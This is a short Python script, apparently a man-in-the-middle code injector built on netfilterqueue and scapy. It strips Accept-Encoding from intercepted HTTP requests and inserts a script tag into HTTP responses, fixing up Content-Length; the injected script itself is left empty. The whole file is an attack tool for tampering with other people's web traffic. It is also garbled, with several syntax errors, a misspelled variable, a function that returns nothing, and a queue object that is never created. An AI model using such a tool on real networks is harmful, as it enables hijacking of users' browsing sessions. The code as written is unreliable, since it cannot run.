#!usr/bin/env/python

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw]load = load
    del[scapy.IP]packet.len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            injection_code = "<script></script>"   #inject the javascript coded btw script tag
            load = load.replace("<body>" + injection_code + "</body>") 
            length_search = re.search("(?:Content-length:\s)(\d*)", load)
            if length_search and "text/html" in load:
                Content_length = length_search.group(1)
                new_content_length = int(Content_length) + len(injection_code)
                load = load.replace(Content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(newe_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue
queue.bind(0, process_packet)
queue.run(0)


